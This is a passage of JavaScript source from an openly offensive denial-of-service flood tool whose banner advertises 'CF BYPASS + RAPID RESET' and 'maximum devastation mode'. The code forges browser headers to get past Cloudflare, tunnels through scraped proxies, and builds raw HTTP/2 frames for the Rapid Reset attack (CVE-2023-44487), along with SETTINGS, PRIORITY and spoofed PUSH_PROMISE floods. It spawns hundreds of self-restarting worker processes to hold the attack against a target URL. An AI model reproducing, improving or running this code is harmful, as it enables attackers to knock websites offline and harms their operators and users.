                    const requestsPerCycle = Math.min(isFull ? effectiveRatelimit * 5 : effectiveRatelimit * 4, 500); // 2.5x more requests
                    for (let i = 0; i < requestsPerCycle; i++) {
                        const browserVersion = getRandomInt(120, 131);

                        const fwfw = ['Google Chrome', 'Brave', 'Microsoft Edge', 'Chromium'];
                        const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
                        const ref = ["same-site", "same-origin", "cross-site"];
                        const ref1 = ref[Math.floor(Math.random() * ref.length)];

                        const brandPatterns = [
                            `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`,
                            `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`,
                            `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`,
                            `\"${wfwf}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`,
                            `\"Not/A)Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`,
                            `\"Chromium\";v=\"${browserVersion}\", \"Not;A Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`
                        ];

                        const isBrave = wfwf === 'Brave';
                        const isEdge = wfwf === 'Microsoft Edge';

                        const acceptHeaderValue = isBrave
                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
                            : isEdge
                                ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
                                : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

                        const langVariations = [
                            'en-US,en;q=0.9',
                            'en-US,en;q=0.8,en-GB;q=0.7',
                            'en-US,en;q=0.7',
                            'en,en-US;q=0.9'
                        ];
                        const langValue = isBrave
                            ? langVariations[Math.floor(Math.random() * langVariations.length)]
                            : 'en-US,en;q=0.7';

                        const secGpcValue = isBrave ? "1" : undefined;

                        const secChUaModel = isBrave ? '""' : undefined;
                        const secChUaPlatform = isBrave ? 'Windows' : undefined;
                        const secChUaPlatformVersion = isBrave ? '10.0.0' : undefined;
                        const secChUaMobile = isBrave ? '?0' : undefined;

                        const secChUa = brandPatterns[Math.floor(Math.random() * brandPatterns.length)];
                        if (cdn1) {
                            const requestHeaders = {
                                'Accept': 'text/html',
                                'Host': url.hostname,
                                'Accept-Language': 'en-US,en;q=0.5',

                                'Content-Type': 'application/json',
                                'Connection': 'keep-alive',
                                "upgrade-insecure-requests": "1",
                                'Cache-Control': 'no-cache',
                                'sec-ch-ua': secChUa,
                                "accept-encoding": "gzip, deflate, br",
                                'Pragma': "no-cache",
                            };

                            const performRequest = async () => {
                                try {
                                    await axios({
                                        method: 'POST',
                                        url: url.hostname,
                                        headers: requestHeaders,
                                        responseType: 'arraybuffer',
                                        maxRedirects: 0,
                                        timeout: 20000,
                                    });
                                } catch (error) {
                                }
                            };

                            const startFlood = async () => {
                                const endTime = performance.now() + time * 1000;
                                const itb = 1000 / ratelimit;

                                while (performance.now() < endTime) {
                                    const requests33 = [];

                                    for (let i = 0; i < threads; i++) {
                                        requests33.push(new Promise(resolve => {
                                            setTimeout(() => {
                                                performRequest();
                                                resolve();
                                            }, itb * i);
                                        }));
                                    }


                                    await Promise.all(requests33);

                                    await new Promise(resolve => setTimeout(resolve, itb * threads));
                                }
                            };

                            startFlood();
                        } else {
                        }
                        const applu = new https.Agent({
                            rejectUnauthorized: false
                        });
                        const getCurrentTime = () => {
                            const now = new Date();
                            return `${now.toLocaleDateString()} ${now.toLocaleTimeString()}`;
                        };

                        if (shitty) {
                            const timeoutPromise = new Promise((resolve, reject) => {
                                setTimeout(() => {
                                    reject(new Error('Request timed out'));
                                }, 5000);
                            });

                            const axiosPromise = axios.get(target, {
                                httpsAgent: applu,
                                headers: {
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
                                }
                            });
                            Promise.race([axiosPromise, timeoutPromise])
                                .then((response) => {

                                    const { status, data } = response;

                                })
                                .catch((error) => {

                                    if (error.message === 'Request timed out') {
                                        console.log('> Precheck: Request Timed Out');
                                    } else if (error.response) {
                                        console.log(`> Precheck: ${error.response.status}`);
                                    } else {
                                        console.log(`> Precheck: ${getCurrentTime()} ${error.message}`);
                                    }
                                });
                        }

                        let randomNum = Math.floor(Math.random() * (10000 - 1000 + 1) + 1000);
                        const currentRefererValue = refererValue === 'rand' ? 'https://' + cc(6, 6) + ".net" : refererValue;

                        // TAMBAHAN: RANDOM METHOD UNTUK HTTP/2
                        const currentMethod = getAttackMethod();

                        const headers = Object.entries({
                            ":method": currentMethod,
                            ":authority": url.hostname,
                            ":scheme": "https",
                            ":path": query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : ""),
                        }).concat(Object.entries({
                            "sec-ch-ua": secChUa,
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": '"Windows"',
                            "sec-ch-ua-platform-version": `"${Math.floor(Math.random() * 3) + 13}.0.0"`,
                            "accept-encoding": "gzip, deflate, br, zstd",
                            "accept-language": langValue,
                            "sec-fetch-site": ref1,
                            "sec-fetch-mode": "navigate",
                            "sec-fetch-user": "?1",
                            "sec-fetch-dest": "document",
                            "upgrade-insecure-requests": "1",
                            "pragma": "no-cache",
                            "cache-control": "no-cache",
                            ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
                        }).filter(a => a[1] != null));


                        const headers2 = Object.entries({
                        }).filter(a => a[1] != null);

                        const headers3 = Object.entries({
                            ...(Math.random() < 0.5 && { "cookie": `${randomNum}` }),

                        }).filter(a => a[1] != null);

                        for (let i = headers2.length - 1; i > 0; i--) {
                            const j = Math.floor(Math.random() * (i + 1));
                            [headers2[i], headers2[j]] = [headers2[j], headers2[i]];
                        }



                        const combinedHeaders = headers.concat(headers2).concat(headers3);





                        if (limit) {
                            async function makeRequest(targetUrl) {
                                while (true) {
                                    try {
                                        // Bug fix: was passing URL object instead of string
                                        const response = await axios.get(targetUrl);
                                        return response.data;
                                    } catch (error) {
                                        if (error.response && error.response.status === 429) {
                                            const retryAfter = parseInt(error.response.headers['retry-after']) || 5;
                                            await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
                                        } else {
                                            throw error;
                                        }
                                    }
                                }
                            }
                            // Bug fix: pass `target` (string) not `url` (URL object)
                            makeRequest(target);
                        }
                        function handleQuery(query) {
                            if (query === '1') {
                                return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
                            } else if (query === '2') {
                                return url.pathname + `${randomPathSuffix}`;
                            } else if (query === '3') {
                                return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                            } else {
                                return url.pathname;
                            }
                        }

                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(combinedHeaders)
                        ]);
                        const flags = 0x1 | 0x4 | 0x8 | 0x20;
                        const encodedFrame = encodeFrame(streamId, 1, packed, flags);
                        const frame = Buffer.concat([encodedFrame]);
                        if (STREAMID_RESET >= 5 && (STREAMID_RESET - 5) % 10 === 0) {
                            // Bug fix: RST frame was written directly to socket instead of being
                            // added to `requests` array, causing it to be sent out-of-order.
                            const rstStreamFrame = encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0);
                            requests.push(rstStreamFrame);
                            STREAMID_RESET = 0;
                        }

                        // Tambah PRIORITY frame untuk stream priority manipulation
                        if (Math.random() < 0.3) {
                            const priorityPayload = Buffer.alloc(5);
                            priorityPayload.writeUInt32BE(0, 0);
                            priorityPayload.writeUInt8(Math.floor(Math.random() * 256), 4);
                            requests.push(encodeFrame(streamId, 2, priorityPayload, 0));
                        }

                        requests.push(encodeFrame(streamId, 1, packed, 0x25));

                        // ─── HTTP/2 RAPID RESET (CVE-2023-44487) ───
                        // Kirim RST_STREAM langsung setelah HEADERS frame
                        // Ini memaksa server allocate resource lalu langsung cancel
                        if (rapidReset) {
                            requests.push(encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x0, 0x8]), 0x0));
                            rapidResetCounter++;
                            // Setiap 50 stream, kirim SETTINGS frame baru untuk confuse server
                            if (rapidResetCounter % 50 === 0) {
                                const settingsFlood = encodeFrame(0, 4, encodeSettings([
                                    [4, 65535 + Math.floor(Math.random() * 1000)],
                                    [3, 1000 + Math.floor(Math.random() * 9000)],
                                ]));
                                requests.push(settingsFlood);
                            }
                        }

                        // Tambah DATA frame random untuk bypass
                        if (Math.random() < 0.2 && postdata) {
                            const dataPayload = Buffer.from(postdata);
                            requests.push(encodeFrame(streamId, 0, dataPayload, 0x1));
                        }

                        // ─── PUSH PROMISE SPOOF ─── confuse CF HTTP/2 parser
                        if (Math.random() < 0.1) {
                            const pushPayload = Buffer.alloc(4);
                            pushPayload.writeUInt32BE(streamId + 1, 0);
                            requests.push(encodeFrame(streamId, 0x5, pushPayload, 0x4));
                        }

                        streamId += 2;

                    }

                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (err) {
                            // Bug fix: use effectiveRatelimit (number) instead of shadowed ratelimit (string)
                            setTimeout(() => main(), 2000 / effectiveRatelimit);
                        } else {
                            // ULTRA: Minimum timing untuk extreme request rate
                            const dynamicDelay = Math.max(5, 1000 / (effectiveRatelimit * 10)) * (Math.random() * 0.1 + 0.9);
                            setImmediate(() => setTimeout(() => main(), dynamicDelay));
                        }
                    })
                }
                main()
            }).on('error', () => {
                tlsSocket.destroy()
            })
        })
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`)
    }).once('error', () => { }).once('close', () => {
        if (tlsSocket) {
            tlsSocket.end(() => { tlsSocket.destroy(); go() })
        }
    })


    netSocket.on('error', (error) => {
        cleanup(error);
    });

    netSocket.on('close', () => {
        cleanup();
    });

    function cleanup(error) {
        if (error) {
            // Silent error handling untuk avoid noise
        }

        try {
            if (tlsSocket && !tlsSocket.destroyed) {
                tlsSocket.removeAllListeners();
                tlsSocket.end();
                tlsSocket.destroy();
            }
        } catch (e) { }

        try {
            if (netSocket && !netSocket.destroyed) {
                netSocket.removeAllListeners();
                netSocket.destroy();
            }
        } catch (e) { }

        // Force garbage collection hint
        if (global.gc) {
            global.gc();
        }
    }
}
function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const selectiveAckOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
    const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];

    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
net.ipv4.tcp_sack=${sack} \
net.ipv4.tcp_window_scaling=${windowScaling} \
net.ipv4.tcp_timestamps=${timestamps} \
net.ipv4.tcp_sack=${selectiveAck} \
net.ipv4.tcp_fastopen=${tcpFastOpen}`;

    exec(command, () => { });
}

setInterval(() => {
    timer++;
}, 1000);

setInterval(() => {
    if (timer <= 10) {
        custom_header = custom_header + 1;
        custom_window = custom_window + 1;
        custom_table = custom_table + 1;
        custom_update = custom_update + 1;
    } else {
        custom_table = 65536;
        custom_window = 6291456;
        custom_header = 262144;
        custom_update = 15663105;

        timer = 0;
    }
}, 10000);

// ─── STARTUP: Auto scrape proxy jika --scrape dipakai ───
async function startCluster() {
    if (scrapeFlag && cluster.isMaster) {
        process.stdout.write(`> [SCRAPER] Fetching proxies from internet... `);
        try {
            const scraped = await scrapeProxies();
            if (scraped.length > 0) {
                // Inject ke proxy array dan simpan ke file sementara
                proxy.length = 0;
                proxy.push(...scraped);
                fs.writeFileSync(proxyfile, scraped.join('\n'), 'utf8');
                console.log(`\u001b[32m${scraped.length} proxies collected!\u001b[0m`);
            } else {
                console.log(`\u001b[33mFailed to scrape, using existing file.\u001b[0m`);
                const fallback = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n').filter(Boolean);
                proxy.push(...fallback);
            }
        } catch (e) {
            console.log(`\u001b[31mScraper error: ${e.message}\u001b[0m`);
            const fallback = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n').filter(Boolean);
            proxy.push(...fallback);
        }
    }

    mainRun();
}

function mainRun() {

if (cluster.isMaster) {

    const workers = {}

    // ULTRA: Maximum CPU utilization dengan aggressive worker spawning
    const cpuCount = os.cpus().length;
    // Bug fix: `threads` is a string from process.argv, must parseInt before arithmetic
    const workerCount = Math.min(parseInt(threads) * cpuCount * 2, 512); // 2x multiplier, max 512 workers

    console.log(`> 🖥️  CPU Cores: ${cpuCount} | 👥 Workers: ${workerCount} | 💾 Memory: ${(os.totalmem() / 1024 / 1024 / 1024).toFixed(2)}GB | 📡 Proxies: ${proxy.length}`);

    Array.from({ length: workerCount }, (_, i) => {
        const worker = cluster.fork({
            core: i % cpuCount,
            UV_THREADPOOL_SIZE: cpuCount * 4
        });
    });

    console.log(`\n╔═══════════════════════════════════════════════════════════════════╗`);
    console.log(`║   █████╗ ███████╗██████╗ ███████╗██████╗  █████╗               ║`);
    console.log(`║  ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗              ║`);
    console.log(`║  ███████║█████╗  ██████╔╝█████╗  ██████╔╝███████║              ║`);
    console.log(`║  ██╔══██║██╔══╝  ██╔══██╗██╔══╝  ██╔══██╗██╔══██║              ║`);
    console.log(`║  ██║  ██║███████╗██║  ██║███████╗██║  ██║██║  ██║              ║`);
    console.log(`║  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝              ║`);
    console.log(`║      ██████╗  █████╗ ███╗   ██╗████████╗███████╗███╗   ██╗     ║`);
    console.log(`║     ██╔════╝ ██╔══██╗████╗  ██║╚══██╔══╝██╔════╝████╗  ██║     ║`);
    console.log(`║     ██║  ███╗███████║██╔██╗ ██║   ██║   █████╗  ██╔██╗ ██║     ║`);
    console.log(`║     ██║   ██║██╔══██║██║╚██╗██║   ██║   ██╔══╝  ██║╚██╗██║     ║`);
    console.log(`║     ╚██████╔╝██║  ██║██║ ╚████║   ██║   ███████╗██║ ╚████║     ║`);
    console.log(`║      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝     ║`);
    console.log(`╠═══════════════════════════════════════════════════════════════════╣`);
    console.log(`║  💀 AEFERA GANTENG v6.9 | CF BYPASS + RAPID RESET 💀            ║`);
    console.log(`║  ⚡ by AEFERA.ME — maximum devastation mode ⚡                   ║`);
    console.log(`╚═══════════════════════════════════════════════════════════════════╝\n`);
    console.log(`> Target: ${target}`);
    console.log(`> Duration: ${time}s | Rate: ${ratelimit}/s | Protocol: HTTP/${forceHttp || 'MIX'}`);

    cluster.on('exit', (worker) => {
        // Instant restart untuk maintain attack intensity
        cluster.fork({ core: worker.id % cpuCount });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message]
    })
    if (debugMode) {
        setInterval(() => {

            let statuses = {}
            for (let w in workers) {
                if (workers[w][0].state == 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (statuses[code] == null)
                                statuses[code] = 0

                            statuses[code] += st[code]
                        }
                    }
                }
            }

            // OPTIMASI: Tampilkan resource usage
            const memUsage = process.memoryUsage();
            const cpuUsage = process.cpuUsage();
            const memUsedMB = (memUsage.heapUsed / 1024 / 1024).toFixed(2);
            const memTotalMB = (memUsage.heapTotal / 1024 / 1024).toFixed(2);
            const cpuPercent = ((cpuUsage.user + cpuUsage.system) / 1000000).toFixed(2);

            console.clear()
            console.log(`╔═══════════════════════════════════════════════════════════════════╗`);
            console.log(`║ 🔥 AEFERA.ME ULTRA FLOOD v5.0 | ${new Date().toLocaleString('us')} ║`);
            console.log(`╠═══════════════════════════════════════════════════════════════════╣`);
            console.log(`║ 📊 Status Codes:`, JSON.stringify(statuses).padEnd(45), `║`);
            console.log(`║ 💾 RAM: ${memUsedMB}/${memTotalMB}MB | ⚡ CPU: ${cpuPercent}s | 👥 Workers: ${Object.keys(workers).length}`.padEnd(63), `║`);
            console.log(`║ 🎯 Target: ${target.substring(0, 45)}`.padEnd(63), `║`);
            console.log(`╚═══════════════════════════════════════════════════════════════════╝`);
        }, 1000)
    }

    setInterval(TCP_CHANGES_SERVER, 5000);
    setTimeout(() => process.exit(1), time * 1000);

} else {
    // OPTIMASI: Set process priority dan memory limits
    process.setMaxListeners(0);

    // Increase memory limit hints
    if (global.gc) {
        setInterval(() => {
            if (process.memoryUsage().heapUsed > 500 * 1024 * 1024) {
                global.gc();
            }
        }, 30000);
    }

    let consssas = 0;
    // ULTRA OPTIMASI: Maximum aggressive connection pooling
    const maxConnections = Math.min(500000, threads * 20000); // 4x more connections
    const connectionDelay = Math.max(delay, 0.1); // Ultra fast connection creation

    let someee = setInterval(() => {
        if (consssas < maxConnections) {
            // ULTRA: Maximum batch size untuk extreme throughput
            const batchSize = Math.min(200, maxConnections - consssas); // 4x batch size

            // Parallel connection creation untuk better CPU utilization
            const promises = [];
            for (let i = 0; i < batchSize; i++) {
                consssas++;
                promises.push(new Promise(resolve => {
                    setImmediate(() => {
                        go();
                        resolve();
                    });
                }));
            }

            // Non-blocking parallel execution
            Promise.all(promises).catch(() => { });
        } else {
            clearInterval(someee);
            return;
        }
    }, connectionDelay);


    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4)
                statusesQ.shift()

            statusesQ.push(statuses)
            statuses = {}
            process.send(statusesQ)
        }, 250)
    }

    setTimeout(() => process.exit(1), time * 1000);
}

} // end mainRun()

// Kick off — auto scrape dulu kalau --scrape dipakai, baru mulai cluster
startCluster().catch(() => mainRun());